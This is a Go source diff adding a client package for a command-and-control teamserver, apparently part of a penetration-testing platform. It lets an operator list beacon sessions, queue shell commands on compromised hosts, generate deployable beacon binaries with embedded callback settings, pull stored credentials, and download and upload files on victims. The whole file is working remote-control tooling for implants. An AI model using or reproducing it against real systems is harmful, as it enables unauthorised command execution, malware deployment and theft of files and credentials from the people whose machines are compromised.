@@ -1,0 +1,325 @@
+// Package c2client — goc2 teamserver 管理 API 的 Go 客户端（移植自 AI-PENTEST
+// backend/app/core/goc2.py）。C2 核心由独立运行的 goc2-server 承载
+// （/api/v1/c2/* 契约），本包只做 HTTP 对接，不移植服务器本体。
+//
+// 配置：环境变量 GOC2_URL（默认 http://172.25.0.1:18400，compose 网关 → 宿主机
+// admin 面）、GOC2_TOKEN（默认 goc2-admin）。
+package c2client
+
+import (
+	"bytes"
+	"context"
+	"encoding/base64"
+	"encoding/json"
+	"fmt"
+	"io"
+	"net/http"
+	"net/url"
+	"os"
+	"strings"
+	"sync"
+	"time"
+)
+
+// DefaultURL 保持与 Python 侧一致；DefaultToken 已移除（2026-11-04 自审计 1934）：
+// 静态默认 token = 任何未改配置的部署共享同一凭据。现 fail-closed——必须显式配置
+// GOC2_TOKEN 环境变量或平台设置里的 c2_token，否则 C2 调用返回明确错误。
+const (
+	DefaultURL = "http://172.25.0.1:18400"
+)
+
+// Config goc2 admin 面连接配置。
+type Config struct {
+	BaseURL string
+	Token   string
+}
+
+// FromEnv 从环境变量构造配置（缺省回退默认值）。
+func FromEnv() Config {
+	u := strings.TrimSpace(os.Getenv("GOC2_URL"))
+	if u == "" {
+		u = DefaultURL
+	}
+	t := strings.TrimSpace(os.Getenv("GOC2_TOKEN")) // 空=未配置；调用侧对空 token 给出明确错误
+	return Config{BaseURL: strings.TrimRight(u, "/"), Token: t}
+}
+
+// ---- 全局默认配置（server 侧用 settings 覆盖，优先级：settings > env > 内置默认） ----
+
+var (
+	defaultMu       sync.RWMutex
+	defaultCfg      Config
+	defaultCfgValid bool
+)
+
+// SetDefault 服务启动/设置变更时写入的运行时默认配置。
+func SetDefault(cfg Config) {
+	defaultMu.Lock()
+	defaultCfg, defaultCfgValid = cfg, strings.TrimSpace(cfg.BaseURL) != ""
+	defaultMu.Unlock()
+}
+
+// CurrentOrDefault 当前生效配置：settings 覆盖 → env → 内置默认。
+func CurrentOrDefault() Config {
+	defaultMu.RLock()
+	defer defaultMu.RUnlock()
+	if defaultCfgValid {
+		return defaultCfg
+	}
+	return FromEnv()
+}
+
+// Client goc2 admin API 客户端。
+type Client struct {
+	cfg Config
+	hc  *http.Client
+}
+
+func New(cfg Config) *Client {
+	if cfg.BaseURL == "" {
+		cfg = CurrentOrDefault()
+	}
+	return &Client{cfg: cfg, hc: &http.Client{Timeout: 20 * time.Second}}
+}
+
+// Request 通用请求：返回 goc2 的 {"data":...} 原始包裹。错误契约是
+// {"detail": ...} + HTTP 状态码。
+func (c *Client) Request(ctx context.Context, method, path string, params url.Values, jsonBody any) (map[string]any, error) {
+	u := c.cfg.BaseURL + "/api/v1/c2" + path
+	if len(params) > 0 {
+		u += "?" + params.Encode()
+	}
+	var body io.Reader
+	if jsonBody != nil {
+		b, err := json.Marshal(jsonBody)
+		if err != nil {
+			return nil, err
+		}
+		body = bytes.NewReader(b)
+	}
+	if strings.TrimSpace(c.cfg.Token) == "" {
+		return nil, fmt.Errorf("goc2 未配置访问 token：请在平台设置（或环境变量 GOC2_TOKEN）里配置 c2_token（自审计 1934 后不再提供默认 token）")
+	}
+	req, err := http.NewRequestWithContext(ctx, method, u, body)
+	if err != nil {
+		return nil, err
+	}
+	req.Header.Set("Authorization", "Bearer "+c.cfg.Token)
+	if jsonBody != nil {
+		req.Header.Set("Content-Type", "application/json")
+	}
+	resp, err := c.hc.Do(req)
+	if err != nil {
+		return nil, fmt.Errorf("goc2 不可达（%s）: %w", c.cfg.BaseURL, err)
+	}
+	defer resp.Body.Close()
+	raw, err := io.ReadAll(io.LimitReader(resp.Body, 64<<20)) // DLL+trailer 的 JSON 可达 ~25MB（b64 膨胀），16MB 会截断致解析失败
+	if err != nil {
+		return nil, err
+	}
+	var payload map[string]any
+	if err := json.Unmarshal(raw, &payload); err != nil {
+		return nil, fmt.Errorf("goc2 返回非 JSON（HTTP %d）", resp.StatusCode)
+	}
+	if resp.StatusCode >= 400 {
+		detail, _ := payload["detail"].(string)
+		if detail == "" {
+			detail = fmt.Sprintf("goc2 HTTP %d", resp.StatusCode)
+		}
+		return payload, fmt.Errorf("%s", detail)
+	}
+	return payload, nil
+}
+
+// data 提取 {"data":...} 包裹里的 data 字段（没有就整包返回）。
+func unwrap(payload map[string]any) map[string]any {
+	if d, ok := payload["data"].(map[string]any); ok {
+		return d
+	}
+	return payload
+}
+
+// ClientSummary beacon 会话摘要字段（JSON 直接透传 goc2 返回）。
+type ClientSummary = map[string]any
+
+// ListClients GET /clients — beacon 会话列表。
+func (c *Client) ListClients(ctx context.Context, params url.Values) ([]any, error) {
+	payload, err := c.Request(ctx, http.MethodGet, "/clients", params, nil)
+	if err != nil {
+		return nil, err
+	}
+	if arr, ok := payload["data"].([]any); ok {
+		return arr, nil
+	}
+	if d, ok := unwrap(payload)["clients"].([]any); ok {
+		return d, nil
+	}
+	return []any{}, nil
+}
+
+// GetClient GET /clients/{id} — 单会话详情。
+func (c *Client) GetClient(ctx context.Context, sessionID string) (map[string]any, error) {
+	payload, err := c.Request(ctx, http.MethodGet, "/clients/"+url.PathEscape(sessionID), nil, nil)
+	if err != nil {
+		return nil, err
+	}
+	return unwrap(payload), nil
+}
+
+// DeleteClient DELETE /clients/{id} — 关闭会话。
+func (c *Client) DeleteClient(ctx context.Context, sessionID string) error {
+	_, err := c.Request(ctx, http.MethodDelete, "/clients/"+url.PathEscape(sessionID), nil, nil)
+	return err
+}
+
+// EnqueueTask POST /clients/{id}/tasks — 任务下发，返回 task_id。
+// 兼容映射：exec 任务参数 command → Go beacon 的 cmd（与 Python 侧一致）。
+func (c *Client) EnqueueTask(ctx context.Context, clientID, taskType string, args map[string]any) (string, error) {
+	if args == nil {
+		args = map[string]any{}
+	}
+	if taskType == "exec" {
+		if cmd, ok := args["command"]; ok {
+			if _, has := args["cmd"]; !has {
+				args["cmd"] = cmd
+			}
+			delete(args, "command")
+		}
+	}
+	payload, err := c.Request(ctx, http.MethodPost, "/clients/"+url.PathEscape(clientID)+"/tasks", nil,
+		map[string]any{"type": taskType, "args": args})
+	if err != nil {
+		return "", err
+	}
+	id, _ := unwrap(payload)["taskId"].(string)
+	return id, nil
+}
+
+// ListTasks GET /clients/{id}/tasks — 任务列表（含结果，用于轮询取回输出）。
+func (c *Client) ListTasks(ctx context.Context, sessionID string, params url.Values) ([]any, error) {
+	payload, err := c.Request(ctx, http.MethodGet, "/clients/"+url.PathEscape(sessionID)+"/tasks", params, nil)
+	if err != nil {
+		return nil, err
+	}
+	if arr, ok := payload["data"].([]any); ok {
+		return arr, nil
+	}
+	if d, ok := unwrap(payload)["tasks"].([]any); ok {
+		return d, nil
+	}
+	return []any{}, nil
+}
+
+// ListListeners GET /listeners — 监听器列表。
+func (c *Client) ListListeners(ctx context.Context) ([]any, error) {
+	payload, err := c.Request(ctx, http.MethodGet, "/listeners", nil, nil)
+	if err != nil {
+		return nil, err
+	}
+	if arr, ok := payload["data"].([]any); ok {
+		return arr, nil
+	}
+	if d, ok := unwrap(payload)["listeners"].([]any); ok {
+		return d, nil
+	}
+	return []any{}, nil
+}
+
+// DeleteListener DELETE /listeners/{id}。
+func (c *Client) DeleteListener(ctx context.Context, id string) error {
+	_, err := c.Request(ctx, http.MethodDelete, "/listeners/"+url.PathEscape(id), nil, nil)
+	return err
+}
+
+// GeneratePayload 生成可直接部署的 beacon 二进制（goc2 /api/v1/c2/generate）。
+// 连接参数（server/listener/encoder）在编译时内嵌——下载即用，无需命令行参数。
+// 返回：二进制 + 元数据（filename/format/language/server/size/encoder）。
+func (c *Client) GeneratePayload(ctx context.Context, listenerID, format, server string) ([]byte, map[string]any, error) {
+	body := map[string]any{
+		"listener_id": listenerID,
+		"format":      format,
+	}
+	if strings.TrimSpace(server) != "" {
+		body["server"] = strings.TrimSpace(server) // 回连地址覆盖（默认请求 Host+listener端口）
+	}
+	resp, err := c.Request(ctx, http.MethodPost, "/generate", nil, body)
+	if err != nil {
+		return nil, nil, err
+	}
+	b64, _ := resp["binary_b64"].(string)
+	if b64 == "" {
+		detail, _ := resp["detail"].(string)
+		if detail == "" {
+			detail = fmt.Sprintf("%v", resp)
+		}
+		return nil, nil, fmt.Errorf("goc2 未返回二进制: %s", detail)
+	}
+	raw, err := base64.StdEncoding.DecodeString(b64)
+	if err != nil {
+		return nil, nil, fmt.Errorf("binary_b64 解码失败: %w", err)
+	}
+	meta := map[string]any{}
+	for k, v := range resp {
+		if k != "binary_b64" {
+			meta[k] = v
+		}
+	}
+	return raw, meta, nil
+}
+
+// ListCredentials GET /credentials — 凭据库。
+func (c *Client) ListCredentials(ctx context.Context) ([]any, error) {
+	payload, err := c.Request(ctx, http.MethodGet, "/credentials", nil, nil)
+	if err != nil {
+		return nil, err
+	}
+	if arr, ok := payload["data"].([]any); ok {
+		return arr, nil
+	}
+	if d, ok := unwrap(payload)["credentials"].([]any); ok {
+		return d, nil
+	}
+	return []any{}, nil
+}
+
+// UpdateNotes PUT /clients/{id}/notes — 会话备注（CS 备注）。
+func (c *Client) UpdateNotes(ctx context.Context, sessionID, notes string) error {
+	_, err := c.Request(ctx, "PUT", "/clients/"+url.PathEscape(sessionID)+"/notes", nil,
+		map[string]any{"notes": notes})
+	return err
+}
+
+// ---- CS 会话功能封装（原生任务类型） ----
+
+// Download 下载文件：output 为 base64(文件内容)。
+func (c *Client) Download(ctx context.Context, sessionID, path string) (string, error) {
+	payload, err := c.Request(ctx, "POST", "/clients/"+url.PathEscape(sessionID)+"/tasks", nil,
+		map[string]any{"type": "download", "args": map[string]any{"path": path}})
+	if err != nil {
+		return "", err
+	}
+	id, _ := unwrap(payload)["taskId"].(string)
+	return id, nil
+}
+
+// Upload 上传文件：data 为 base64（goc2 字段名是 data，非 content）。
+func (c *Client) Upload(ctx context.Context, sessionID, path, b64 string) (string, error) {
+	payload, err := c.Request(ctx, "POST", "/clients/"+url.PathEscape(sessionID)+"/tasks", nil,
+		map[string]any{"type": "upload", "args": map[string]any{"path": path, "data": b64}})
+	if err != nil {
+		return "", err
+	}
+	id, _ := unwrap(payload)["taskId"].(string)
+	return id, nil
+}
+
+// Sleep 调整心跳间隔。
+func (c *Client) Sleep(ctx context.Context, sessionID string, interval float64, jitter float64) (string, error) {
+	payload, err := c.Request(ctx, "POST", "/clients/"+url.PathEscape(sessionID)+"/tasks", nil,
+		map[string]any{"type": "sleep", "args": map[string]any{"interval": interval, "jitter": jitter}})
+	if err != nil {
+		return "", err
+	}
+	id, _ := unwrap(payload)["taskId"].(string)
+	return id, nil
+}
